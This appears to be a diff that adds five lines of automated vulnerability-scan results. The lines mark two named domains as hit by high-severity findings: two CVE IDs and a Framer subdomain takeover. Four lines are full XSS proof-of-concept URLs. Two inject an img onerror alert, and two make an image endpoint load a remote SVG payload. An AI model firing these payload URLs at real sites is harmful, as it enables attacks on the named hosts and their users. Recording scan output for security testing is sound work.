@@ -1,0 +1,5 @@
+[CVE-2025-64764] [http] [high] https://www.zeusnetwork.xyz/_server-islands/FeaturesStats?e=file&p&s={"hiixp":"<img+src=x+onerror=alert(0)>"}
+[CVE-2025-64764] [http] [high] https://zeusnetwork.xyz/_server-islands/FeaturesStats?e=file&p&s={"hiixp":"<img+src=x+onerror=alert(0)>"}
+[CVE-2025-58179] [http] [high] https://www.zeusnetwork.xyz/_image?href=https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/refs/heads/main/helpers/payloads/retool-xss.svg&f=svg
+[CVE-2025-58179] [http] [high] https://zeusnetwork.xyz/_image?href=https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/refs/heads/main/helpers/payloads/retool-xss.svg&f=svg
+[framer-takeover] [http] [high] https://year-in-review-2025.edgevana.com
